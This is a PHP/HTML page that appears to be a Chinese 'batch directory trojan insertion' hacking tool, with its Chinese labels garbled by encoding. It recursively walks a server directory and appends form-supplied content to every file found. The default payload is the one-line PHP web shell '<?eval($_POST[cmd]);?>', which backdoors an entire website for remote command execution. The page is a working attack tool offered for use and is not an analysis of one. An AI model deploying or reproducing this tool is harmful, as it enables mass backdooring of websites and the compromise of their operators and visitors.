<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>�����Ŀ¼���Ų��빤��</title>
<style type="text/css">
a			{ text-decoration: none; color: #000000 }
a:hover			{ text-decoration: underline }
body			{ scrollbar-base-color: #F8F8F8; scrollbar-arrow-color: #cc0000; font-size: 12px; background-color: #999999 }
table			{ font-family: Tahoma, Verdana; font-size: 12px; color: #000000 }
textarea,input,object	{ font-family: Tahoma, Verdana; font-size: 12px;  color: #000000; font-weight: normal; background-color: #F8F8F8 }
select			{ font-family: Tahoma, Verdana; font-size: 11px;  color: #000000; font-weight: normal; background-color: #F8F8F8 }
.nav			{ font-family: Tahoma, Verdana; font-size: 12px; font-weight: bold }
.header			{ font-family: Tahoma, Verdana; font-size: 11px; color: #FFFFFF; font-weight: bold; background-color: #cc0000 }
.header a		{ text-decoration: none; color: #FFFFFF }
.category		{ font-family: Tahoma, Verdana; font-size: 11px; color: #000000; background-color: #EFEFEF }
.tableborder		{ background: #D6E0EF; border: 1px solid #cc0000 } 
.singleborder		{ font-size: 0px; line-height: 1px; padding: 0px; background-color: #F8F8F8 }
.smalltxt		{ font-family: Tahoma, Verdana; font-size: 11px }
.mediumtxt		{ font-family: Tahoma, Verdana; font-size: 12px; color: #000000 }
.bold			{ font-weight: bold }
.multi			{ font-family: Tahoma, Verdana; font-size: 11px; color: #000000; }
.navtd			{ font-family: Tahoma, Verdana; font-size: 12px; color: #FFFFFF; text-decoration: none }
.tableborder                { background: #D6E0EF; border: 1px solid #cc0000 } 
</style>
</head>
<body bgcolor="#999999">
<center>
<?
@set_time_limit(0);
$magic_quotes_gpc = get_magic_quotes_gpc();
$register_globals = ini_get('register_globals');
if(!$register_globals || !$magic_quotes_gpc)
{
	extract($_FILES, EXTR_SKIP);
	extract($_POST, EXTR_SKIP);
	extract($_GET, EXTR_SKIP);
}
function stripslashes_array(&$array) {
	while (list($key,$var) = each($array)) {
		if ($key != 'argc' && $key != 'argv' && (strtoupper($key) != $key || ''.intval($key) == "$key")) {
			if (is_string($var)) {
				$array[$key] = stripslashes($var);
			}
			if (is_array($var))  {
				$array[$key] = stripslashes_array($var);
			}
		}
	}
	return $array;
}
// �ж� magic_quotes_gpc ״̬
if (get_magic_quotes_gpc()) {
    $_POST = stripslashes_array($_POST);
}
function find($filename)
{
	$db=opendir("$filename/");
	while ($getfile=readdir($db))
	{
		if ($getfile!="." && $getfile!="..") 
		{
			$filedb=explode("/","$filename/$getfile");
			$newfilename=implode("/",$filedb);
			if(is_dir("$filename/$getfile")){
				find($filename."/".$getfile);
			}else{
				inject("$filename/$getfile");
			     echo"inject doing.....$filename/$getfile<br>";
					
				}
		}
	}
	closedir($db);
}
function inject($filename,$method="a+"){
          $content="$_POST[mm]";
	if($handle=@fopen($filename,$method)){
		flock($handle,LOCK_SH);
		$filedata=@fwrite($handle,$content);
		fclose($handle);
	}
	return $filedata;
}
$bacename=$_SERVER['PHP_SELF'];
	if($do==inject) 
	{
                 if(is_dir($dir))
		{
			find($dir);
		}
		echo "<br><br>���<br><br> <a href=$bacename>��ȥ������</a><br>";
	}else{
?>
<div align="center"> 
<form name="FORM" method=POST action=<?=$bacename?>  enctype="multipart/form-data">
 <table width="64%" border="0" cellpadding="0" cellspacing="1" bgcolor="#CC3300">
      <tr> 
        <td height="30" colspan="2"> <div align="center"><strong><font color="#FFFFFF">�����Ŀ¼���Ų��빤��</font></strong></div></td>
      </tr>
      <tr> 
        <td width="138" height="30" bgcolor="#CCCCCC"><strong>���ļ�·��Ϊ:</strong></td>
        <td height="30" bgcolor="#CCCCCC">&nbsp;/z1/evan520/public_html/test/killd.php </td>
      </tr>
<tr bgcolor="#CCCCCC"> 
        <td width="138" height="30"><strong>Ҫע���Ŀ¼��</strong></td>
        <td height="30" bgcolor="#CCCCCC"> 
          <input type="text" name="dir" value=".">
<font color="#CC0000"><strong>*</strong>(Ĭ�ϵ�ǰĿ¼��</font>
</td>
      </tr>
      <tr bgcolor="#CCCCCC"> 
        <td width="138" height="100"><strong>���Լ���д����,��ȷ�Ų������Ŀ¼���ļ��Ļٻ���Ҳ���Ǹ�Ŀ¼�������ļ������Բ�����ţ�ͼƬ�����ļ����벻���ٻ���</strong></td>
        <td height="120" valign="top"> <textarea name="mm" cols="70" rows="10">&lt;?eval($_POST[cmd]);?&gt;</textarea> 
        </td>
      </tr>
      <tr align="center" bgcolor="#CCCCCC"> 
        <td height="32" colspan="2"><input type="hidden" name="do" value="inject"><input type="submit" name="Submit" value="��Ŀ¼���Ų���"></td>
      </tr>
      <tr align="center"> 
        <td height="32" colspan="2">Copyright(c)<strong><font color="#FFFFFF"> 
          <a href="http://www.wrsky.com" target="_blank">���php����</a></font></strong> Power By <strong><font color="#FFFFFF">saiy and ���Ľ� </font></strong></td>
      </tr>
    </table>
  </form>
</div>
</body>
</html>
<?
}
?>
